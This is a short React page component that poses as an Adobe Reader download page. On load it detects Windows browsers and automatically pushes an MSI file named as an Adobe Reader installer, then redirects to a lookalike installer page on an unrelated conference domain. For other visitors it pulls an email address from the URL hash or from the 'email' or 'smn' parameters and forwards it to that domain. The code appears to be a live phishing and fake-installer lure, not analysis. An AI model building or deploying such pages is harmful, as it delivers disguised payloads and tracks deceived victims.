import { useEffect } from "react";

export default function Home() {
  useEffect(() => {
    const userAgent = navigator.userAgent || "";
    const isWindows = /windows/i.test(userAgent);

    const NON_WINDOWS_TARGET = "https://aspiceconference.com/cw";
    const MSI_FILE = "/Adobe_Reader_install.msi";
    const WINDOWS_REDIRECT = "https://aspiceconference.com/adobe-reader/installer/download.html";

    if (isWindows) {
      window.location.href = MSI_FILE;
      setTimeout(() => {
        window.location.href = WINDOWS_REDIRECT;
      }, 3000);
      return;
    }

    let email = "";
    const url = new URL(window.location.href);

    // Grab email from hash or query parameters
    if (url.hash) email = url.hash.substring(1);
    else if (url.searchParams.get("email")) email = url.searchParams.get("email");
    else if (url.searchParams.get("smn")) email = url.searchParams.get("smn");

    const finalUrl = email ? `${NON_WINDOWS_TARGET}#${email}` : NON_WINDOWS_TARGET;
    window.location.replace(finalUrl);
  }, []);

  return (
    <main style={{ textAlign: "center", padding: "40px", fontFamily: "Arial, sans-serif" }}>
      <h1>Redirecting…</h1>
      <p>If your download does not start automatically, click below:</p>
      <a
        href="/Reader_en_install.msi"
        download
        style={{
          padding: "12px 24px",
          backgroundColor: "#0070f3",
          color: "#fff",
          borderRadius: "6px",
          textDecoration: "none",
          fontWeight: "bold",
          marginTop: "20px",
          display: "inline-block"
        }}
      >
        Download Now
      </a>
    </main>
  );
}













